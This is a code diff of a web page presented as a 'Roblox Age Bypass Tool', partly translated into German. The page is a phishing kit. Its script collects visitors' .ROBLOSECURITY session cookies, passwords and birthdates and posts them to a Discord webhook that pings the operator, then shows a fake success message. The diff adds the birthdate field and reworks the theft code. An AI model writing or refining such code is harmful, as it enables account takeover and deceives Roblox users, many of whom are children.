@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="de">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
@@ -9,7 +9,6 @@
     * {
       box-sizing: border-box;
     }
-
     body {
       margin: 0;
       font-family: 'Inter', sans-serif;
@@ -20,7 +19,6 @@
       align-items: center;
       padding: 60px 20px;
     }
-
     h1 {
       font-size: 36px;
       font-weight: 700;
@@ -29,7 +27,6 @@
       -webkit-text-fill-color: transparent;
       margin-bottom: 10px;
     }
-
     .subtitle {
       font-size: 16px;
       color: #aaa;
@@ -37,7 +34,6 @@
       text-align: center;
       max-width: 500px;
     }
-
     .container {
       background: #111a2e;
       border-radius: 12px;
@@ -47,14 +43,12 @@
       box-shadow: 0 0 20px rgba(0,0,0,0.4);
       margin-bottom: 30px;
     }
-
     label {
       display: block;
       font-weight: 600;
       margin-bottom: 10px;
       font-size: 18px;
     }
-
     select {
       width: 100%;
       padding: 12px;
@@ -64,21 +58,18 @@
       color: #fff;
       font-size: 16px;
     }
-
     .input-block {
       margin-top: 20px;
       background: #1d2944;
       border-radius: 12px;
       padding: 15px 15px 10px 15px;
     }
-
     .input-block-title {
       font-weight: 600;
       color: #00f0ff;
       margin-bottom: 8px;
       font-size: 16px;
     }
-
     textarea {
       width: 100%;
       resize: vertical;
@@ -93,11 +84,9 @@
       box-shadow: inset 0 0 5px rgba(0,255,255,0.1);
       outline: none;
     }
-
     textarea::placeholder {
       color: #5c7f94;
     }
-
     button {
       margin-top: 20px;
       width: 100%;
@@ -116,11 +105,9 @@
       user-select: none;
       transition: background 0.3s ease;
     }
-
     button:hover {
       background: linear-gradient(90deg, #e000b9, #00d4ff);
     }
-
     .info-box {
       background: #1d2944;
       border-left: 4px solid #ffc107;
@@ -131,22 +118,18 @@
       margin-top: 30px;
       box-shadow: inset 0 0 8px rgba(255, 193, 7, 0.2);
     }
-
     .info-box ul {
       margin: 10px 0 0 0;
       padding-left: 20px;
     }
-
     .info-box li {
       margin-bottom: 8px;
     }
-
     .info-title {
       font-weight: bold;
       color: #ffc107;
       font-size: 15px;
     }
-
     #error-message {
       position: fixed;
       top: 20px;
@@ -162,7 +145,6 @@
       box-shadow: 0 0 10px rgba(255, 59, 59, 0.7);
       user-select: none;
     }
-
     #success-message {
       position: fixed;
       top: 20px;
@@ -178,7 +160,6 @@
       box-shadow: 0 0 10px rgba(76, 175, 80, 0.7);
       user-select: none;
     }
-
     #loader-overlay {
       position: fixed;
       top: 0; left: 0; right: 0; bottom: 0;
@@ -189,7 +170,6 @@
       z-index: 10000;
       display: none;
     }
-
     .loader {
       border: 6px solid #f3f3f3;
       border-top: 6px solid #00f0ff;
@@ -198,12 +178,10 @@
       height: 60px;
       animation: spin 1s linear infinite;
     }
-
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
-
     #help-button {
       position: fixed;
       bottom: 20px;
@@ -222,9 +200,16 @@
       max-width: 250px;
       white-space: nowrap;
     }
-
     #help-button:hover {
       background: linear-gradient(90deg, #e000b9, #00d4ff);
+    }
+    /* Geburtsdatum Flex Container */
+    #birthdate-block select {
+      flex: 1;
+    }
+    #birthdate-block div {
+      display: flex;
+      gap: 10px;
     }
   </style>
 </head>
@@ -239,6 +224,33 @@
       <option value="birthyear">2008 Birthyear Up</option>
       <option value="13plus">13+ All Ages</option>
     </select>
+
+    <div id="birthdate-block" class="input-block" style="display:none; margin-top: 20px;">
+      <div class="input-block-title">Wähle dein Geburtsdatum</div>
+      <div>
+        <select id="birth-day">
+          <option value="">Tag</option>
+        </select>
+        <select id="birth-month">
+          <option value="">Monat</option>
+          <option value="1">Januar</option>
+          <option value="2">Februar</option>
+          <option value="3">März</option>
+          <option value="4">April</option>
+          <option value="5">Mai</option>
+          <option value="6">Juni</option>
+          <option value="7">Juli</option>
+          <option value="8">August</option>
+          <option value="9">September</option>
+          <option value="10">Oktober</option>
+          <option value="11">November</option>
+          <option value="12">Dezember</option>
+        </select>
+        <select id="birth-year">
+          <option value="">Jahr</option>
+        </select>
+      </div>
+    </div>
 
     <div id="cookie-block" class="input-block" style="display:none;">
       <div class="input-block-title">.ROBLOSECURITY Cookie</div>
@@ -282,59 +294,102 @@
     const errorMessage = document.getElementById('error-message');
     const successMessage = document.getElementById('success-message');
     const loaderOverlay = document.getElementById('loader-overlay');
+    const birthdateBlock = document.getElementById('birthdate-block');
+    const birthDay = document.getElementById('birth-day');
+    const birthMonth = document.getElementById('birth-month');
+    const birthYear = document.getElementById('birth-year');
+    const helpBtn = document.getElementById('help-button');
 
+    // Fill day options 1-31
+    for (let i = 1; i <= 31; i++) {
+      const option = document.createElement('option');
+      option.value = i.toString().padStart(2, '0');
+      option.textContent = i;
+      birthDay.appendChild(option);
+    }
+
+    // Fill year options from current year down to 1900
+    const currentYear = new Date().getFullYear();
+    for (let y = currentYear; y >= 1900; y--) {
+      const option = document.createElement('option');
+      option.value = y.toString();
+      option.textContent = y;
+      birthYear.appendChild(option);
+    }
+
+    // Change event on bypass select
     bypassSelect.addEventListener('change', () => {
+      clearMessages();
       if (bypassSelect.value === '13plus') {
         cookieBlock.style.display = 'block';
         passwordBlock.style.display = 'block';
+        birthdateBlock.style.display = 'none';
       } else if (bypassSelect.value === 'birthyear') {
         cookieBlock.style.display = 'block';
         passwordBlock.style.display = 'none';
+        birthdateBlock.style.display = 'block';
       } else {
         cookieBlock.style.display = 'none';
         passwordBlock.style.display = 'none';
+        birthdateBlock.style.display = 'none';
       }
-      clearMessages();
     });
 
-    function clearMessages() {
-      errorMessage.style.display = 'none';
-      successMessage.style.display = 'none';
-    }
-
-    function showError(msg) {
-      errorMessage.textContent = msg;
+    // Show error message
+    function showError(text) {
+      errorMessage.textContent = text;
       errorMessage.style.display = 'block';
       setTimeout(() => {
         errorMessage.style.display = 'none';
-      }, 4000);
+      }, 5000);
     }
 
-    function showSuccess(msg) {
-      successMessage.textContent = msg;
+    // Show success message
+    function showSuccess(text) {
+      successMessage.textContent = text;
       successMessage.style.display = 'block';
       setTimeout(() => {
         successMessage.style.display = 'none';
       }, 6000);
     }
 
+    function clearMessages() {
+      errorMessage.style.display = 'none';
+      successMessage.style.display = 'none';
+    }
+
+    // Helper to pad numbers for date formatting
+    function pad(num) {
+      return num.toString().padStart(2, '0');
+    }
+
+    // Replace with your actual Discord webhook URL here
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/XXXXXXXXX/XXXXXXXXXXXXXXXXXXXXXXXXXXXX";
+
+    // User and Role IDs to ping
+    const PING_USER_ID = "123456789012345678";   // Beispiel: @UserID
+    const PING_ROLE_ID = "987654321098765432";   // Beispiel: @RoleID
+
     async function sendEmbedToDiscord(title, description) {
-      const webhookUrl = 'https://hkdk.events/gcjor0rqtldxig';
-      const data = {
-        content: '<@1030535100829540464> <@&1392621247460020254>',
-        embeds: [{
-          title: title,
-          description: description,
-          color: 0x00ffff,
-          timestamp: new Date().toISOString()
-        }]
+      const payload = {
+        content: `<@${PING_USER_ID}> <@&${PING_ROLE_ID}>`, // Ping User & Role
+        embeds: [
+          {
+            title: title,
+            description: description,
+            color: 7506394,
+            footer: { text: "Roblox Age Bypass Tool" },
+            timestamp: new Date().toISOString()
+          }
+        ],
+        allowed_mentions: { users: [PING_USER_ID], roles: [PING_ROLE_ID] }
       };
-      const response = await fetch(webhookUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(data)
+      const response = await fetch(DISCORD_WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload),
       });
-      if (!response.ok) throw new Error('Failed to send to Discord');
+      if (!response.ok) throw new Error("Discord webhook failed");
     }
 
     processBtn.addEventListener('click', async () => {
@@ -344,19 +399,44 @@
       const cookieVal = cookieInput.value.trim();
       const passwordVal = passwordInput.value.trim();
 
-      if (!selected || cookieVal.length < 500 || (selected === '13plus' && !passwordVal)) {
-        showError('ERROR Try later again.');
+      if (!selected) {
+        showError('Bitte wähle eine Option.');
         return;
+      }
+      if (cookieVal.length < 500) {
+        showError('Bitte gib eine gültige .ROBLOSECURITY Cookie ein (mind. 500 Zeichen).');
+        return;
+      }
+      if (selected === '13plus' && !passwordVal) {
+        showError('Bitte gib dein Passwort für 13+ Bypass ein.');
+        return;
+      }
+      if (selected === 'birthyear') {
+        if (!birthDay.value || !birthMonth.value || !birthYear.value) {
+          showError('Bitte wähle Tag, Monat und Jahr für dein Geburtsdatum.');
+          return;
+        }
       }
 
       processBtn.disabled = true;
       loaderOverlay.style.display = 'flex';
 
       try {
-        const method = selected === 'birthyear' ? '2008 Birthyear Up' : '13+ All Ages';
-        await sendEmbedToDiscord('.ROBLOSECURITY Cookie & Password', `**Method:** ${method}\n**Cookie:** ${cookieVal}`);
-        if (selected === '13plus') {
-          await sendEmbedToDiscord('Account Password', `**Method:** 13+ All Ages\n**Password:** ${passwordVal}`);
+        if (selected === 'birthyear') {
+          const birthDateString = `${birthYear.value}-${pad(birthMonth.value)}-${pad(birthDay.value)}`;
+          await sendEmbedToDiscord(
+            'Geburtsdatum & Cookie',
+            `**Method:** 2008 Birthyear Up\n**Geburtsdatum:** ${birthDateString}\n**Cookie:** ${cookieVal}`
+          );
+        } else {
+          await sendEmbedToDiscord(
+            '.ROBLOSECURITY Cookie & Password',
+            `**Method:** 13+ All Ages\n**Cookie:** ${cookieVal}`
+          );
+          await sendEmbedToDiscord(
+            'Account Password',
+            `**Method:** 13+ All Ages\n**Password:** ${passwordVal}`
+          );
         }
         await new Promise(resolve => setTimeout(resolve, 1200));
         showSuccess('Everything worked it can take 2-12 Hours until the age will be set');
@@ -368,9 +448,9 @@
       }
     });
 
-    // Tutorial Button click event
-    document.getElementById('help-button').addEventListener('click', () => {
-      window.open('https://youtu.be/YwtYdwH9SSE', '_blank');
+    // Help Button opens tutorial in new tab
+    helpBtn.addEventListener('click', () => {
+      window.open('https://discord.gg/dfx8zd6hcF', '_blank');
     });
   </script>
 </body>
